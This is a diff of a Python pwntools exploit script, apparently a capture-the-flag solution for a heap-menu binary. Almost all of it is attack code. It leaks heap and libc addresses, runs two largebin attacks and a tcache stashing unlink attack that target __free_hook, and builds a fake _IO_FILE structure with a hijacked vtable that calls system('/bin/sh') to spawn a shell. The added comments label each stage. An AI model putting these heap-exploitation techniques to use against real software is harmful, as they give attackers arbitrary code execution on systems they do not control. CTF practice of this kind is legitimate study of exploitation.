@@ -86,77 +86,80 @@ def edit(size,idx,content):
 			p.recvline()
 			p.send(content)
 
-# new(0xe50, 0)
+####---- 5 * 0x120 chunk in tcache		----####
 for i in range(5):
 	new(0x110, i)
-new(0xe50, 0)
-for i in range(5):
 	delete(0x110, i)
+
+####---- 2 * 0x120 chunk in smallbin 	----####
+new(0xe50, 0)
 new(0xdd0, 0)
 new(0xe50, 0)
-delete(0xdd0, 0)
+delete(0xdd0, 0) 		# in smallbin
 new(0xcb0, 0)
-new(0xdd0, 1)
-new(0xe50, 1)
+new(0xe50, 0)
+new(0xdd0, 1)			# in smallbin
+new(0xe50, 0)
 delete(0xdd0, 1)
-new(0xcb0, 1)
+new(0xcb0, 0)
 
-new(0xdd0, 2)
-new(0xe50, 2)
-new(0xcb0, 2)
-delete(0xdd0, 2)
-new(0xe50, 2)
-show(0xdd0, 2)
-ru(b"Content is")
-leak = uu64(rn(8))
-lg("leak")
-libc_base = leak - 0x1ed1e0
-leak = uu64(rn(8))
-lg("leak")
-leak = uu64(rn(8))
-lg("leak")
-heap_base = leak - 0x4f10
-leak = uu64(rn(8))
-lg("leak")
-lg("libc_base")
+####---- addr leak 	----####
+show(0x110, 1)
+ru(b'Content is')
+rn(8)
+heap_base = uu64(rn(8)) - 0x10
 lg("heap_base")
-edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base + 0x4f10) + p64(libc_base+l.symbols['__free_hook']-0x28))
-delete(0xcb0, 2)
-new(0xe50, 2)
+show(0xdd0, 0)
+ru(b'Content is')
+rn(8)
+libc_base = uu64(rn(8)) - 0x1ed1e0
+lg("libc_base")
 
-edit(0xdd0, 2, p64(heap_base+0x6b50) + p64(0x1ed1e0+libc_base) + p64(heap_base+0x6b50)*2)
-edit(0xcb0, 2, p64(libc_base+0x1ed1e0) + p64(0x4f10+heap_base)*3)
-
+####---- Largebin attack_1 	----####
 new(0xdd0, 2)
-new(0xe50, 2)
-new(0xcb0, 2)
+new(0xe50, 0)
+new(0xcb0, 0)
 delete(0xdd0, 2)
-new(0xe50, 2)
-edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base + 0x4f10) + p64(libc_base+0x1ed5a0-0x20))
-delete(0xcb0, 2)
-new(0xe50, 2)
+new(0xe50, 0)
+delete(0xcb0, 0)
+edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base+0x5d70) + p64(libc_base + l.symbols['__free_hook'] - 0x28))
+new(0xe50, 0)
+edit(0xdd0, 2, p64(heap_base + 0x79b0) + p64(libc_base+0x1ed1e0) + p64(heap_base + 0x79b0)*2)
+edit(0xcb0, 0, p64(libc_base+0x1ed1e0) + p64(heap_base + 0x5d70)*3)
 
-edit(0xdd0, 1, ((p64(libc_base+0x1ed1e0)*2)+p64(heap_base + 0x4f10)*2).ljust(0xcb8, b'\x00') + p64(0x121) + p64(heap_base+0x2350)+p64(libc_base+l.symbols['__free_hook']-0x20))
-new(0x110, 0)
+####---- Largebin attack_2 	----####
+new(0xdd0, 2)
+new(0xe50, 0)
+new(0xcb0, 0)
+delete(0xdd0, 2)
+new(0xe50, 0)
+delete(0xcb0, 0)
+edit(0xdd0, 2, p64(libc_base+0x1ed1e0)*2 + p64(heap_base+0x5d70) + p64(libc_base + 0x1ed5a0 - 0x20))
+new(0xe50, 1)			# fake_IO_buffer
 
-IO_str_vtable = libc_base+0x1e9560
-system_addr = libc_base+l.symbols['system']
-fake_IO_FILE = 2*p64(0)
-fake_IO_FILE += p64(1)
-fake_IO_FILE += p64(0xffffffffffff)
+####---- tcache stashing unlink attack 	----####
+edit(0xdd0, 1, b'a'*0xcb8 + p64(0x121) + p64(heap_base+0x2350) + p64(libc_base+l.symbols['__free_hook'] - 0x20))
+new(0x110, 0) 			# calloc(0x110);
+
+####---- fake IO 	----####
+IO_str_vtable 	= libc_base + 0x1e9560
+system_addr		= libc_base + l.symbols['system']
+fake_IO_FILE =  2*p64(0)							#fp->flag=0
+fake_IO_FILE +=  p64(1)								#_IO_write_base = 1
+fake_IO_FILE += p64(0xffffffffffff)					#_IO_write_ptr = 0xffffffffffff
+##### fp->_IO_write_ptr - fp->_IO_write_base >= _IO_buf_end - _IO_buf_base #####
 fake_IO_FILE += p64(0)
-fake_IO_FILE += p64(heap_base+0x6c30)
-fake_IO_FILE += p64(heap_base+0x6c30+0x58)
-fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\x00')
-fake_IO_FILE += p64(0)
-fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\x00')
-fake_IO_FILE += p64(IO_str_vtable)
+fake_IO_FILE += p64(heap_base+0x7a90)				#_IO_buf_base
+fake_IO_FILE += p64(heap_base+0x7a90+0x58)			#_IO_buf_end
+fake_IO_FILE = 	fake_IO_FILE.ljust(0xb0, b'\x00')
+fake_IO_FILE += p64(0)								#change _mode = 0
+fake_IO_FILE = 	fake_IO_FILE.ljust(0xc8, b'\x00')
+fake_IO_FILE += p64(IO_str_vtable)					#change vtable
 payload = fake_IO_FILE + b'/bin/sh\x00' + 2*p64(system_addr)
-
-
-edit(0xcb0, 2, payload)
-p.recvuntil(b"> ")
-sl(b"quit")
-
+edit(0xcb0, 0, payload)
 debugPID()
+
+####---- getshell 	----####
+ru(b"> ")
+sl(b"quit")
 irt()
